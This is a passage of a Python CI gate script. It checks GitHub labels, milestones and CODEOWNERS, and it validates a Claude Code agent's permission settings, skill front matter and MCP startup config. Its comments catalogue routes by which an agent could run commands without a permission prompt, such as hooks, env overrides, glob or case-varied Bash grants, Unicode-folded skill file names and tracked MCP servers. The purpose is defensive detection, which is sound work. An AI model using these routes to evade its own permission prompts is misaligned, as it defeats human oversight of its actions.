    if start is None or end is None or end <= start:
        raise ValueError(
            "label-taxonomy.md is missing the delimited persona-labels block that the offline "
            "roster<->label check reads (expected 'BEGIN persona-labels' / 'END persona-labels' "
            "markers) — restore it so --offline can still catch roster/label drift"
        )
    labels: "set[str]" = set()
    token = re.compile(rf"^\s*{re.escape(PERSONA_PREFIX)}([\w-]+)\s*$")
    for line in lines[start + 1 : end]:
        match = token.match(line)
        if match:
            labels.add(match.group(1))
    if not labels:
        raise ValueError(
            "the persona-labels block in label-taxonomy.md lists no 'persona:<slug>' labels"
        )
    return labels


# --- Check 3: milestone dropdown <-> live milestones -------------------------------------

def parse_milestone_options(text: str) -> "list[str]":
    """Extract the `id: milestone` dropdown's `options:` list from an issue-form YAML.

    Stdlib-only, targeted parser for the GitHub issue-form structure (no PyYAML):
    locate `id: milestone`, bound the element at the next `- type:`, find its `options:`
    key, and collect the deeper-indented `- <value>` list items (quotes stripped).
    """
    lines = text.splitlines()
    start = None
    for index, line in enumerate(lines):
        if line.strip() == "id: milestone":
            start = index
            break
    if start is None:
        raise ValueError("no dropdown with 'id: milestone' found in the feature form")

    end = len(lines)
    for index in range(start + 1, len(lines)):
        if re.match(r"^\s*-\s+type:", lines[index]):
            end = index
            break

    options_indent = None
    options_line = None
    for index in range(start, end):
        match = re.match(r"^(\s*)options:\s*$", lines[index])
        if match:
            options_indent = len(match.group(1))
            options_line = index
            break
    if options_line is None:
        raise ValueError("the 'id: milestone' dropdown has no 'options:' list")

    options: "list[str]" = []
    for index in range(options_line + 1, end):
        raw = lines[index]
        if raw.strip() == "":
            continue
        indent = len(raw) - len(raw.lstrip(" "))
        if indent <= options_indent:
            break  # dedented out of the options list
        item = re.match(r"^\s*-\s+(.*)$", raw)
        if not item:
            break  # a deeper non-list line ends the options block
        value = item.group(1).strip()
        if len(value) >= 2 and value[0] in "\"'" and value[-1] == value[0]:
            value = value[1:-1]
        options.append(value)
    if not options:
        raise ValueError("the 'id: milestone' dropdown 'options:' list is empty")
    return options


def check_milestones(form_options: "list[str]", live_titles: "list[str]") -> "list[str]":
    """Return problems reconciling the dropdown options against live milestone titles."""
    problems: "list[str]" = []
    live = set(live_titles)
    form = list(form_options)
    for title in sorted(live):
        if title not in form:
            problems.append(
                f"live GitHub milestone {title!r} is missing from the feature_request.yml "
                f"milestone dropdown — add it as an option"
            )
    for option in form:
        if option in live or option in SENTINEL_MILESTONE_OPTIONS:
            continue
        problems.append(
            f"milestone dropdown option {option!r} is not a live GitHub milestone (nor a "
            f"documented sentinel) — remove or rename the stale option"
        )
    return problems


# --- Check 2: CODEOWNERS parse errors ----------------------------------------------------

def check_codeowners_errors(errors: "list") -> "list[str]":
    """Return one problem line per CODEOWNERS parse/owner error (empty ⇒ clean).

    GitHub's ``codeowners/errors`` payload lists objects shaped like
    ``{"path": ..., "line": N, "kind": ..., "message": ...}``. Any entry is a
    reconciliation failure. Kept a pure, testable function so the self-test can prove the
    check actually reddens on an error fixture (rather than being vacuously green).
    """
    problems: "list[str]" = []
    for err in errors:
        path = err.get("path", "?")
        kind = err.get("kind", "error")
        message = err.get("message", "")
        problems.append(f"{path}: {kind} — {message}".strip())
    return problems


# --- Check 4: .claude/settings.json permission surface -----------------------------------

def _bash_command(entry: str) -> "str | None":
    """Return the normalized command inside a ``Bash(...)`` permission entry, else None.

    ``Bash(gh  api:*)`` → ``gh api``: the ``Bash(...)`` wrapper and the trailing ``:*``
    argument wildcard are stripped, INTERNAL WHITESPACE IS COLLAPSED, and the result is
    LOWERCASED, so an entry cannot dodge the policy below by padding the command with extra
    spaces or a tab, nor by changing its case. Case matters because macOS/Windows
    filesystems are case-INSENSITIVE: ``Bash(GH api:*)`` resolves to the real ``gh`` binary
    and Claude Code honors the rule, so ``GH api`` must compare equal to ``gh api``
    (R5-F3). Non-``Bash`` entries (``Read(...)``, ``WebFetch(...)``) return None — this
    policy is about shell commands.
    """
    match = re.match(r"^Bash\((.*)\)$", entry.strip(), re.DOTALL)
    if not match:
        return None
    inner = match.group(1)
    if inner.endswith(":*"):
        inner = inner[: -len(":*")]
    return " ".join(inner.split()).lower()


def _token_prefix(shorter: str, longer: str) -> bool:
    """True when ``shorter`` equals ``longer`` or is a whole-TOKEN prefix of it.

    Token-aware so ``git`` matches ``git push`` (it would auto-allow it) while ``git-foo``
    does not — mirroring how Claude Code matches a permission prefix (``prefix + " "``).
    """
    return longer == shorter or longer.startswith(shorter + " ")


def validate_settings(path: str = DEFAULT_SETTINGS) -> "list[str]":
    """Return problems with `.claude/settings.json`'s permission surface (empty ⇒ clean).

    `.claude/settings.json` is a security-relevant control: an over-broad ``allow`` entry
    silently widens what an agent runs WITHOUT a prompt, and a deleted ``deny`` entry
    re-opens a mutating command. The file changes rarely and by hand, which is exactly the
    profile of a control that rots unwatched — so it is reconciled like any other governance
    artifact. Everything here is local, so the check runs identically offline and in CI.

    Enforced:

    * the file parses as JSON and ``permissions`` is an object;
    * ``allow`` and ``deny`` are LISTS OF STRINGS — the list type is asserted BEFORE
      iterating, so ``"allow": "Bash(gh:*)"`` is reported as a problem instead of being
      iterated character-by-character (which would vacuously "pass" every string check);
    * no ``allow`` entry auto-allows a mutating command: an entry is rejected when its
      normalized command is a token-prefix of (or equal to, or a longer form of) any of
      :data:`FORBIDDEN_ALLOW_COMMANDS`. This rejects the broad ``Bash(gh:*)`` and
      ``Bash(git:*)`` as well as the direct ``Bash(gh api:*)``. The comparison is
      CASE-INSENSITIVE: on a case-insensitive filesystem ``Bash(GH api:*)`` resolves to the
      real ``gh`` and the CLI honors the rule, so it must not slip past;
    * no TOOL-WIDE or unparseable Bash grant (``Bash``, ``Bash()``): a bare tool name allows
      every shell command, which is broader still than ``Bash(*)``;
    * no blanket wildcard (``Bash(*)``, ``Bash(:*)``, an empty command) and no GLOB — a ``*``
      surviving anywhere in the command after the trailing ``:*`` is stripped, e.g.
      ``Bash(gh *)`` / ``Bash(gh api*)``, is matched as ``^gh.*$``;
    * ``permissions.defaultMode``, when present, is one of :data:`ALLOWED_DEFAULT_MODES`
      (``default``/``plan``) — the two prompt-disabling modes in
      :data:`FORBIDDEN_DEFAULT_MODES` keep their sharper message, and every other value
      (notably ``acceptEdits``, which auto-approves file writes) is rejected too;
    * the key surface is an ALLOWLIST, not a blocklist: only :data:`ALLOWED_TOP_LEVEL_KEYS`
      may appear at top level and only :data:`ALLOWED_PERMISSION_KEYS` (plus the specifically
      rejected ``additionalDirectories``) inside ``permissions``. Every EXECUTABLE-VALUED key
      — ``hooks``, ``env``, ``apiKeyHelper``, ``statusLine``, and the rest of
      :data:`HELPER_COMMAND_KEYS` — is therefore rejected, as is any key added by a future
      Claude Code release that this gate has never heard of; such keys belong in
      ``settings.local.json``;
    * every entry of :data:`REQUIRED_DENY_ENTRIES` is present verbatim.

    Anything else in ``allow`` is out of scope: this bounds the file's blast radius, it does
    not certify the permission surface as a whole.

    Returns problems rather than raising so a malformed file reports as DRIFT (exit 1) with
    an actionable message, never as a traceback.
    """
    problems: "list[str]" = []
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
    except OSError as exc:
        return [f"{path}: cannot be read ({exc.__class__.__name__}: {exc})"]
    except json.JSONDecodeError as exc:
        return [f"{path}: is not valid JSON ({exc}) — fix the syntax"]

    if not isinstance(data, dict):
        return [f"{path}: top level must be a JSON object, got {type(data).__name__}"]
    permissions = data.get("permissions")
    if not isinstance(permissions, dict):
        return [
            f"{path}: 'permissions' must be an object, got "
            f"{type(permissions).__name__} — the permission gate cannot be validated"
        ]

    # Sibling keys widen the surface REGARDLESS of how tight allow/deny are, and several were
    # proven to auto-run a command while the allow/deny lists still validated clean. Naming
    # them one by one never closed: Claude Code ships new command-valued keys (`env`,
    # `apiKeyHelper`, `statusLine`, ...) faster than a blocklist can track (R5-F1). So the
    # policy is an ALLOWLIST — every top-level key outside :data:`ALLOWED_TOP_LEVEL_KEYS` is a
    # problem — with the specific "here is what this key executes" messages checked FIRST so
    # the report still explains the dangerous ones instead of saying only "unknown key".
    for key in data:
        if key in ALLOWED_TOP_LEVEL_KEYS:
            continue
        if key == "hooks":
            problems.append(
                f"{path}: project settings must not define hooks; put them in "
                f"settings.local.json — a tracked 'hooks' block runs arbitrary commands on "
                f"tool events with NO permission prompt, bypassing permissions.allow/deny "
                f"entirely"
            )
        elif key == "env":
            problems.append(
                f"{path}: project settings must not define 'env'; put it in "
                f"settings.local.json — it overrides the environment of every auto-allowed "
                f"command (PATH, GIT_*, http_proxy, ...), so it redirects commands the "
                f"allow list already approved with NO permission prompt"
            )
        elif key in HELPER_COMMAND_KEYS:
            # The parenthetical is only TRUE of apiKeyHelper (it runs at CLI startup, before
            # any tool call); the rest run on their own trigger, so they get the plain clause.
            startup = (
                " (apiKeyHelper runs at CLI startup, before any tool call)"
                if key == "apiKeyHelper"
                else ""
            )
            problems.append(
                f"{path}: project settings must not define {key!r}; put it in "
                f"settings.local.json — it runs a command with no permission prompt"
                f"{startup}"
            )
        else:
            problems.append(
                f"{path}: unknown top-level key {key!r} is not allowed in the tracked "
                f"project settings; put it in settings.local.json — only "
                f"{', '.join(repr(k) for k in ALLOWED_TOP_LEVEL_KEYS)} may appear here, "
                f"because a key this gate does not understand may execute a command with "
                f"no permission prompt"
            )

    # The same allowlist discipline inside `permissions`.
    for key in permissions:
        if key in ALLOWED_PERMISSION_KEYS:
            continue
        if key == "additionalDirectories":
            continue  # specific message emitted below
        problems.append(
            f"{path}: unknown key 'permissions.{key}' is not allowed in the tracked project "
            f"settings; put it in settings.local.json — 'permissions' may hold only "
            f"{', '.join(repr(k) for k in ALLOWED_PERMISSION_KEYS)}"
        )

    if "defaultMode" in permissions:
        default_mode = permissions.get("defaultMode")
        if isinstance(default_mode, str) and default_mode in FORBIDDEN_DEFAULT_MODES:
            problems.append(
                f"{path}: 'permissions.defaultMode' is {default_mode!r} — that mode skips the "
                f"permission prompt for every tool call, which makes the allow/deny lists below "
                f"moot; remove it and let the prompting default modes apply"
            )
        elif not isinstance(default_mode, str) or default_mode not in ALLOWED_DEFAULT_MODES:
            # e.g. `acceptEdits`: still prompts for Bash, but auto-approves every file write.
            # In the TRACKED settings that is a checked-out branch editing the worktree with
            # no prompt, so the allowlist admits only the fully prompting modes.
            problems.append(
                f"{path}: 'permissions.defaultMode' is {default_mode!r} — the tracked project "
                f"settings may only set "
                f"{' or '.join(repr(m) for m in ALLOWED_DEFAULT_MODES)} (any other mode "
                f"auto-approves tool calls, e.g. 'acceptEdits' auto-approves file writes); "
                f"put it in settings.local.json if a local worktree needs it"
            )
    if "additionalDirectories" in permissions:
        problems.append(
            f"{path}: 'permissions.additionalDirectories' is set "
            f"({permissions['additionalDirectories']!r}) — it widens file access beyond the "
            f"repository working tree, so it must not live in the tracked project settings; "
            f"put it in settings.local.json if a local worktree genuinely needs it"
        )

    lists: "dict[str, list]" = {}
    for key in ("allow", "deny"):
        value = permissions.get(key, [])
        # Type-check BEFORE iterating: a bare string is iterable, so `all(isinstance(x, str)
        # for x in value)` would be vacuously true for it and the whole policy below would
        # silently inspect single characters.
        if not isinstance(value, list):
            problems.append(
                f"{path}: 'permissions.{key}' must be a LIST of strings, got "
                f"{type(value).__name__} — wrap the entry in a JSON array"
            )
            continue
        non_strings = [item for item in value if not isinstance(item, str)]
        if non_strings:
            problems.append(
                f"{path}: 'permissions.{key}' contains {len(non_strings)} non-string "
                f"entry/entries (e.g. {non_strings[0]!r}) — every entry must be a string"
            )
        lists[key] = [item for item in value if isinstance(item, str)]

    for entry in lists.get("allow", []):
        stripped = entry.strip()
        if not re.match(r"^Bash\b", stripped):
            continue  # not a Bash rule (Read(...), WebFetch(...), BashOutput) — out of scope
        command = _bash_command(stripped)
        if command is None or stripped in ("Bash", "Bash()"):
            # A bare `Bash` is a TOOL-WIDE grant — Claude Code reads it as "allow every shell
            # command, never prompt". `Bash()` and any spelling this policy cannot parse are
            # treated the same way rather than skipped: an entry we cannot read must never
            # mean "unchecked".
            problems.append(
                f"{path}: allow entry {entry!r} is a tool-wide or malformed Bash grant — a "
                f"bare 'Bash' auto-allows EVERY shell command; write specific "
                f"'Bash(<command>:*)' entries for the read-only commands instead"
            )
            continue
        if command in ("", "*") or command.startswith("*"):
            problems.append(
                f"{path}: allow entry {entry!r} is a blanket wildcard — it auto-allows every "
                f"shell command; list the specific read-only commands instead"
            )
            continue
        if "*" in command:
            # Only a TRAILING `:*` (stripped above) is an argument wildcard. Any other `*` is
            # matched as a GLOB: `Bash(gh *)` and `Bash(gh api*)` become `^gh.*$` and auto-run
            # `gh api` / `gh pr merge` without a prompt.
            problems.append(
                f"{path}: allow entry {entry!r} (command {command!r}) contains a glob "
                f"wildcard '*' — Claude Code expands it to match any command line with that "
                f"prefix; use a literal command with the trailing ':*' argument wildcard only"
            )
            continue
        for forbidden in FORBIDDEN_ALLOW_COMMANDS:
            if _token_prefix(command, forbidden) or _token_prefix(forbidden, command):
                problems.append(
                    f"{path}: allow entry {entry!r} (command {command!r}) auto-allows "
                    f"'{forbidden}' — that command mutates repo/GitHub state and must always "
                    f"prompt; narrow the entry"
                )
                break

    deny = lists.get("deny")
    if deny is not None:
        present = set(deny)
        for required in REQUIRED_DENY_ENTRIES:
            if required not in present:
                problems.append(
                    f"{path}: deny list is missing {required!r} — restore it (a removed deny "
                    f"entry silently re-opens a mutating command)"
                )
    return problems


# --- Check 5: .claude/commands + .claude/skills front matter -----------------------------

def validate_command_skill_frontmatter(
    path: str, frontmatter: "dict[str, str]", kind: str
) -> "list[str]":
    """Return policy problems with one command/skill front matter (empty ⇒ clean).

    ``kind`` is ``"command"`` (a `.claude/commands/**/*.md` slash command, held to
    :data:`ALLOWED_COMMAND_KEYS`) or ``"skill"`` (a `.claude/skills/**/SKILL.md` manifest,
    held to :data:`ALLOWED_SKILL_KEYS` — a skill is addressed by its ``name``, a command by
    its filename). Both are held to the same rejection table,
    :data:`FORBIDDEN_COMMAND_SKILL_KEYS`, with the specific "why" message winning over the
    generic unknown-key one.
    """
    allowed = ALLOWED_SKILL_KEYS if kind == "skill" else ALLOWED_COMMAND_KEYS
    problems: "list[str]" = []
    for key in frontmatter:
        if key in FORBIDDEN_COMMAND_SKILL_KEYS:
            reason = FORBIDDEN_COMMAND_SKILL_KEY_REASONS.get(key)
            because = f" ({reason})" if reason else ""
            if key == "allowed-tools":
                remedy = (
                    "it grants UNPROMPTED tool use; a per-machine grant belongs in "
                    "`permissions.allow` of the untracked .claude/settings.local.json, or "
                    "drop the key so the tool call prompts and is reviewed by hand"
                )
            else:
                remedy = (
                    "keys in this table configure unprompted tool use or execution, so it "
                    "must not appear in a tracked file"
                )
            problems.append(
                f"{kind} file {path!r} defines {key!r}{because}; {remedy}; tracked {kind} "
                f"files may carry only {', '.join(repr(k) for k in allowed)}"
            )
        elif key not in allowed:
            problems.append(
                f"{kind} file {path!r} carries unknown front-matter key {key!r}; tracked "
                f"{kind} files may carry only {', '.join(repr(k) for k in allowed)} — a key "
                f"this gate does not understand may grant unprompted tool use (as "
                f"`allowed-tools` does)"
            )
    return problems


def scan_command_skill_frontmatter(
    commands_dir: str = DEFAULT_COMMANDS_DIR, skills_dir: str = DEFAULT_SKILLS_DIR
) -> "tuple[list[str], int, int]":
    """Return (problems, commands scanned, skills scanned) for the command/skill surface.

    Walks `commands_dir` for every `*.md` (a slash command is any markdown file there) and
    `skills_dir` for every `SKILL.md` (the manifest; a skill's other markdown files are
    reference material Claude Code does not read as configuration). The walk is RECURSIVE
    and uses :func:`os.walk` for the same reason :func:`read_roster` does: `.claude/commands/**`
    ships nested and dot-prefixed directories, which a recursive ``glob`` would skip, and a
    command file the gate never opens is exactly the file an `allowed-tools:` grant hides in.
    Symlinked directories are not followed (a link loop cannot hang the gate) but ARE
    reported: Claude Code follows a symlinked `.claude/skills/<x>` into a tree whose
    `allowed-tools:` this walk never reads, so the link is a problem, not a silent skip
    (CERT-F1).

    A MISSING directory does not raise here — this scanner only counts. The CALLER
    (`command_skill_result`) turns zero skill manifests into a failure, because the repo
    tracks `.claude/skills`; `.claude/commands` stays optional (nothing tracked lives there
    today). The counts in the passing report attest to how many files the policy covered.

    Each file's front matter is read by the SAME strict reader the roster uses
    (:func:`_read_frontmatter`), so every spelling a real YAML parser reads as configuration
    but this gate cannot — a quoted `"allowed-tools":`, `allowed-tools : ...`, a flow
    mapping, a duplicate key — is a problem rather than a silent skip. A file with NO
    front-matter fence at all carries no keys and is fine (it is a plain prompt).
    """
    problems: "list[str]" = []
    counts = {"command": 0, "skill": 0}
    for kind, root in (("command", commands_dir), ("skill", skills_dir)):
        link_problems: "list[str]" = []
        # `.claude/commands` / `.claude/skills` may BE the link. A dangling one is not a
        # directory, so `os.path.isdir` would skip it as "absent" and the commands scan —
        # which is allowed to find nothing — would pass over a link that resolves to a live
        # command tree on any machine where the target exists (FINAL-CERT F1).
        if os.path.islink(root):
            link_problems.append(_symlink_problem(kind, root))
        if not os.path.isdir(root):
            problems.extend(link_problems)
            continue
        paths: "list[str]" = []
        for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
            dirnames.sort()  # deterministic traversal order
            link_problems.extend(_walk_symlink_problems(kind, dirpath, dirnames))
            for filename in filenames:
                path = os.path.join(dirpath, filename)
                # EVERY entry is link-checked before the name match: a DANGLING link is
                # listed here under whatever name it carries, and letting the name decide
                # whether the link is even looked at is how one that resolves on another
                # machine stays invisible.
                if os.path.islink(path):
                    link_problems.append(_symlink_problem(f"{kind} file", path))
                # FOLDED (NFC + casefold), not lowered: Claude Code loads a manifest
                # committed as `skill.md` and a command as `x.MD`, so a case-sensitive match
                # would fail GREEN — and `str.lower()` is not enough either. `ſ` (U+017F) is
                # unchanged by `lower()`, so a tracked `.claude/skills/evil/ſkill.md` was not
                # scanned at all while APFS resolved `SKILL.md` straight to it and the CLI
                # loaded its `allowed-tools:` (PR-901 F-1). `_fold` maps it — and `K`
                # (U+212A) — onto the canonical name. NFC, never NFKC: `evil.ｍd` (fullwidth
                # m) is a DIFFERENT file to the checkout and to the CLI's own `*.md` match,
                # so folding it in would police a file nothing loads.
                if (
                    _is_markdown_name(filename)
                    if kind == "command"
                    else _is_skill_manifest_name(filename)
                ):
                    paths.append(path)
        paths.sort()
        problems.extend(sorted(link_problems))
        for path in paths:
            counts[kind] += 1
            try:
                frontmatter, duplicate_keys = _read_frontmatter(path)
            except FrontmatterError as exc:
                # Fail CLOSED, exactly as the roster does: front matter this gate cannot read
                # strictly must cost the same as a policy violation, because Claude Code's
                # real YAML parser may well read an `allowed-tools:` out of it.
                problems.append(f"{kind} file {path!r} {exc}")
                continue
            if frontmatter is None:
                continue  # no front-matter fence: a plain prompt, no keys to police
            for key in duplicate_keys:
                problems.append(
                    f"{kind} file {path!r} declares duplicate front-matter key {key!r}; YAML "
                    f"keeps the LAST value while this gate reads the first, so the policy "
                    f"would validate a value the CLI never uses — keep exactly one {key!r} "
                    f"line"
                )
            problems.extend(validate_command_skill_frontmatter(path, frontmatter, kind))
    return problems, counts["command"], counts["skill"]


# --- Tracked startup configuration (.mcp.json / .claude/settings.local.json) --------------

def _git_tracked(path: str) -> "bool | None":
    """Is `path` TRACKED by git? ``True``/``False``, or ``None`` when git cannot say.

    Tracking — not mere existence — is the question that matters (CERT-F3 addendum). A
    developer legitimately keeps an untracked `.claude/settings.local.json` (or a personal
    `.mcp.json`) on their machine; that is their business and the gate must not redden a
    local run over it. What must never happen is one of those files being COMMITTED, because
    then it ships to every checkout — and in CI the checkout contains tracked files only, so
    `git ls-files` is authoritative there.

    ``None`` (git missing, or not a git checkout) is deliberately NOT collapsed into
    "untracked": the caller reports it as UNVERIFIED rather than passing silently, so an
    environment where the gate cannot answer never looks like an environment where the
    answer was "clean".
    """
    if shutil.which("git") is None:
        return None
    absolute = os.path.abspath(path)
    cwd = os.path.dirname(absolute) or os.curdir
    if not os.path.isdir(cwd):  # pragma: no cover - defensive
        return None
    try:
        proc = subprocess.run(
            ["git", "ls-files", "--error-unmatch", "--", absolute],
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=30,
            env=_git_env(),
        )
    except (OSError, subprocess.TimeoutExpired):  # pragma: no cover - environment dependent
        return None
    if proc.returncode == 0:
        return True
    if proc.returncode == 128:
        # 128 is "not a git repository" / another fatal git error: cannot determine.
        return None
    return False


def settings_local_path(settings_path: str = DEFAULT_SETTINGS) -> str:
    """The `settings.local.json` that sits beside the policed `settings.json`.

    Derived from `--settings` rather than given its own flag so the two can never be pointed
    at different directories (a fixture — or an operator — that redirects one must redirect
    both, or the check would police a file the CLI would not read).
    """
    directory = os.path.dirname(settings_path)
    return os.path.join(directory, SETTINGS_LOCAL_NAME) if directory else SETTINGS_LOCAL_NAME


def validate_startup_config(
    mcp_path: str, settings_local_path: str
) -> "tuple[list[str], list[str], list[str]]":
    """Return (problems, notes, unverified) for the tracked startup-configuration surface.

    Two files Claude Code reads that `settings-permissions` never looks at:

    * **`.mcp.json`** at the repo root. Every `mcpServers[*].command` is SPAWNED when the CLI
      launches — before any tool call, with no permission prompt — so a tracked one is remote
      code execution on `git checkout`, ranking with `hooks`/`apiKeyHelper` in the settings
      allowlist. An empty `mcpServers` mapping (or none at all) declares no command and
      passes; malformed JSON FAILS, because a file this gate cannot read is not evidence of
      safety.
    * **`.claude/settings.local.json`**. The CLI honors it exactly like `settings.json`,
      and every remedy message in this gate tells the reader to put a per-machine grant
      there. That advice is only safe while the file is UNTRACKED; a committed one silently
      widens the permission surface of every checkout while the policed `settings.json`
      still reads clean.

    Only TRACKED files fail. An untracked local copy is reported in ``notes`` ("present
    locally, untracked") so a responder reading a green run still knows it is there, and a
    file whose tracking git cannot determine goes to ``unverified`` — never to ``notes`` as
    if it had been cleared. "Tracked" is asked of the CHECKED-OUT path, not of one byte-exact
    spelling (:func:`_tracked_by_git`): on a macOS clone of a repo that committed
    `.claude/Settings.local.json`, the file the CLI honors is the one at
    `.claude/settings.local.json`, and answering "untracked" about it was how a committed
    per-machine grant read as harmless local state (PR-901 second round, H-1).
    """
    problems: "list[str]" = []
    notes: "list[str]" = []
    unverified: "list[str]" = []

    # `lexists`, not `exists`: a DANGLING symlink at .mcp.json exists as a repo entry (git
    # tracks it as mode 120000 and Claude Code resolves it on any machine where the target is
    # present) while `exists` reports False and would emit the flatly untrue note below
    # (FINAL-CERT F1).
    if not os.path.lexists(mcp_path):
        notes.append(f"no {mcp_path} in the checkout (no MCP server is started at launch)")
    elif os.path.islink(mcp_path):
        # A link is not read THROUGH: what the target holds here says nothing about what it
        # holds elsewhere. Tracking decides — a tracked link is reported by the caller's
        # git-mode check, an untracked one is the developer's own machine state.
        tracked = _tracked_by_git(mcp_path)
        if tracked is None:
            unverified.append(
                f"{mcp_path} is a symlink and git cannot say whether it is tracked (git "
                f"missing or not a git checkout) — NOT verified; re-run inside the git checkout"
            )
        elif tracked:
            problems.append(_tracked_link_problem("120000", mcp_path))
        else:
            notes.append(
                f"{mcp_path} present locally as an untracked symlink — not policed (only a "
                f"committed one ships to everyone); its target was not read"
            )
    else:
        tracked = _tracked_by_git(mcp_path)
        if tracked is None:
            unverified.append(
                f"{mcp_path} exists but git cannot say whether it is tracked (git missing or "
                f"not a git checkout) — its MCP servers were NOT verified; re-run inside the "
                f"git checkout"
            )
        elif not tracked:
            notes.append(
                f"{mcp_path} present locally, untracked — not policed (a per-machine MCP "
                f"config is the developer's business; only a committed one ships to everyone)"
            )
        else:
            servers, failure = _read_mcp_servers(mcp_path)
            if failure is not None:
                problems.append(failure)
            elif servers:
                problems.append(
                    f"{mcp_path} defines {len(servers)} MCP server command(s) that Claude "
                    f"Code starts at launch with no prompt; MCP servers must be configured "
                    f"per machine in settings.local.json / the user config, not tracked "
                    f"(server(s): {', '.join(sorted(servers))})"
                )
            else:
                notes.append(f"{mcp_path} is tracked but declares no MCP server")

    # `lexists` again: a dangling `.claude/settings.local.json` link is a tracked repo entry
    # the CLI resolves wherever the target exists, and "no settings.local.json in the
    # checkout" would be a false all-clear (FINAL-CERT F1). Its content is never read here,
    # so tracking alone decides — as it already did for the non-link case.
    if not os.path.lexists(settings_local_path):
        notes.append(f"no {settings_local_path} in the checkout")
    else:
        tracked = _tracked_by_git(settings_local_path)
        if tracked is None:
            unverified.append(
                f"{settings_local_path} exists but git cannot say whether it is tracked (git "
                f"missing or not a git checkout) — NOT verified; re-run inside the git checkout"
            )
        elif not tracked:
            notes.append(
                f"{settings_local_path} present locally, untracked — not policed (that is "
                f"exactly where a per-machine grant belongs)"
            )
        else:
            problems.append(
                f"{settings_local_path} is TRACKED (by that spelling, or by one that folds "
                f"onto it on this checkout); Claude Code honors it exactly like "
                f"settings.json but it must be gitignored per-machine state — a committed "
                f"one widens the permission surface of every checkout while the policed "
                f"settings.json still reads clean; `git rm --cached {settings_local_path}` "
                f"and keep it untracked"
            )
    return problems, notes, unverified


def _read_mcp_servers(path: str) -> "tuple[dict, str | None]":
    """Return (mcpServers mapping, failure message). A file the gate cannot read FAILS."""
    try:
        with open(path, "r", encoding="utf-8") as handle:
            payload = json.load(handle)
    except (OSError, UnicodeDecodeError, ValueError) as exc:
        return (
            {},
            f"{path} is tracked and could not be read as JSON ({exc.__class__.__name__}: "
            f"{exc}); Claude Code parses it at launch, so an unreadable tracked startup "
            f"config is not evidence that no MCP server starts — remove the tracked file",
        )
    if not isinstance(payload, dict):
        return ({}, f"{path} is tracked and is not a JSON object; remove the tracked file")
    servers = payload.get("mcpServers", {})
    if servers is None:
        servers = {}
    if not isinstance(servers, dict):
        return (
            {},
            f"{path} is tracked and its 'mcpServers' is {type(servers).__name__}, not an "
            f"object; the gate cannot enumerate what would start at launch — remove the "
            f"tracked file",
        )
    return (servers, None)


# --- gh plumbing -------------------------------------------------------------------------

def _gh(args: "list[str]", timeout: int = 90) -> "tuple[bool, str, str]":
    """Run `gh <args>`; return (ok, stdout, error). ok=False if gh is missing/errors."""
    if shutil.which("gh") is None:
        return (False, "", "gh CLI not found on PATH")
    try:
        proc = subprocess.run(
            ["gh", *args], capture_output=True, text=True, timeout=timeout
        )
    except subprocess.TimeoutExpired:
        return (False, "", f"gh timed out after {timeout}s")
    except OSError as exc:  # pragma: no cover - environment dependent
        return (False, "", f"could not execute gh: {exc}")
    if proc.returncode != 0:
        message = (proc.stderr or proc.stdout or "").strip()
        return (False, proc.stdout, message or f"gh exited {proc.returncode}")
    return (True, proc.stdout, "")


def fetch_persona_labels(repo: str) -> "tuple[bool, set[str], str]":
    ok, out, err = _gh(
        ["api", f"repos/{repo}/labels?per_page=100", "--paginate", "--jq", ".[].name"]
    )
    if not ok:
        return (False, set(), err)
    labels = {
        line.strip()[len(PERSONA_PREFIX):]
        for line in out.splitlines()
        if line.strip().startswith(PERSONA_PREFIX)
    }
    return (True, labels, "")


def fetch_milestones(repo: str) -> "tuple[bool, list[str], str]":
    ok, out, err = _gh(
        [
            "api",
            f"repos/{repo}/milestones?per_page=100&state=open",
            "--paginate",
            "--jq",
            ".[].title",
        ]
    )
    if not ok:
        return (False, [], err)
    titles = [line.strip() for line in out.splitlines() if line.strip()]
    return (True, titles, "")


def codeowners_errors_endpoint(repo: str, ref: "str | None") -> str:
    """Build the ``codeowners/errors`` API path, pinning to ``ref`` when provided.

    Without a ref GitHub validates the repository's DEFAULT branch; in CI we pass the PR
    head/merge SHA so a PR that *breaks* CODEOWNERS fails the PR gate — not only after it
    has already merged. The ref is URL-encoded so a full ref path (``refs/pull/N/merge``)
    is passed safely as a query value.
    """
    endpoint = f"repos/{repo}/codeowners/errors"
    if ref:
        endpoint += f"?ref={urllib.parse.quote(str(ref), safe='')}"
    return endpoint


def fetch_codeowners_errors(repo: str, ref: "str | None" = None) -> "tuple[bool, list, str]":
    ok, out, err = _gh(["api", codeowners_errors_endpoint(repo, ref)])
    if not ok:
        return (False, [], err)
    try:
        data = json.loads(out or "{}")
    except json.JSONDecodeError as exc:
        return (False, [], f"could not parse codeowners/errors response: {exc}")
    return (True, list(data.get("errors", [])), "")


# --- Orchestration -----------------------------------------------------------------------

# The checks that depend on the GitHub API. A `skip` from one of these is an OUTAGE; a skip
# from any other (local) check is an environment the gate could not interrogate. `main` keeps
# the two apart so a responder is never sent to the wrong runbook.
REMOTE_CHECK_NAMES = frozenset(
    {"roster<->live-labels", "codeowners-errors", "milestone-dropdown"}
)


def _fail_notes(notes: "list[str]", unverified: "list[str]") -> "list[str]":
    """`notes` plus any `unverified` reason, marked, for a check that is FAILING (PR-901 F-3).

    Status precedence puts FAIL above SKIP — correctly: a check with a real problem must
    redden the gate rather than report an environment complaint. What was wrong is that the
    unverified REASON was then dropped entirely, so a run with `--mcp-config` outside the work
    tree printed a genuine failure while silently forgetting that part of the surface had not
    been looked at at all. Fixing the named problem would then have turned the gate green over
    an unexamined tree. The reason rides along as a NOTE: visible to the reader, never an
    `::error::` annotation of its own (a note is context, not a verdict — FINAL-CERT F5).
    """
    return list(notes) + [
        f"ALSO UNVERIFIED (not covered by the failure above): {line}" for line in unverified
    ]


class Result:
    """Outcome of a single check: status is 'pass' | 'fail' | 'skip'.

    ``lines`` are the check's VERDICT lines — the problems when it failed, the reason when it
    skipped, the evidence when it passed — and they are what :func:`_print_summary` turns into
    a GitHub `::error::`/`::warning::` annotation. ``notes`` are context that is true whatever
    the verdict ("no .mcp.json in the checkout"); they are printed as plain detail lines and
    NEVER annotated, so a failing check does not raise an inline PR error against a
    reassuring fact and send a reviewer looking for a defect in it (FINAL-CERT F5).
    """

    def __init__(
        self,
        name: str,
        status: str,
        lines: "list[str] | None" = None,
        notes: "list[str] | None" = None,
    ) -> None:
        self.name = name
        self.status = status
        self.lines = lines or []
        self.notes = notes or []


def _remote_or_skip(
